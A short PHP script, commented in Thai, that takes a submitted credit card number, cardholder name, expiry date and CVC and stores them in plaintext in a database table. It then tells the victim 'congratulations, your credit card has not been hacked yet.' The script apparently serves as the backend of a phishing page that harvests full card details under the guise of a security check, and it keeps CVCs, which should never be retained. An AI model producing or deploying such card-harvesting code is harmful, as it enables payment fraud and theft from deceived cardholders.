<?php 
    session_start();
    include('server.php');
    
    $errors = array();

    if (isset($_POST['reg_user'])) {
        $cardnum = mysqli_real_escape_string($conn, $_POST['cardnum']);
        $name = mysqli_real_escape_string($conn, $_POST['name']);
        $date = mysqli_real_escape_string($conn, $_POST['date']);
        $cvc = mysqli_real_escape_string($conn, $_POST['cvc']);

        if (empty($cardnum)) {
            array_push($errors, "ต้องใส่ เลขบัตร");
            $_SESSION['error'] = "ต้องใส่ เลขบัตร";
        }
        if (empty($name)) {
            array_push($errors, "ต้องใส่ ชื่อ");
            $_SESSION['error'] = "ต้องใส่ชื่อ";
        }
        if (empty($date)) {
            array_push($errors, "ต้องใส่ เลข หมดอายุ");
            $_SESSION['error'] = "ต้องใส่ เลข หมดอายุ";
        }
        if (empty($cvc)) {
            array_push($errors, "ต้องใส่ เลข cvc");
            $_SESSION['error'] = "ต้องใส่ เลข cvc";
        }

        if (count($errors) == 0) {

            $sql = "INSERT INTO users (cardnum, name, date, cvc) VALUES ('$cardnum', '$name', '$date', '$cvc')";
            mysqli_query($conn, $sql);

            $_SESSION['username'] = $name;
            $_SESSION['success'] = "ยินดีด้วยครับบัตรเครดิตของคุณยังไม่ถูกแฮก";
            header('location: success.php');
        } else {
            header("location: register.php");
        }
    }

?>
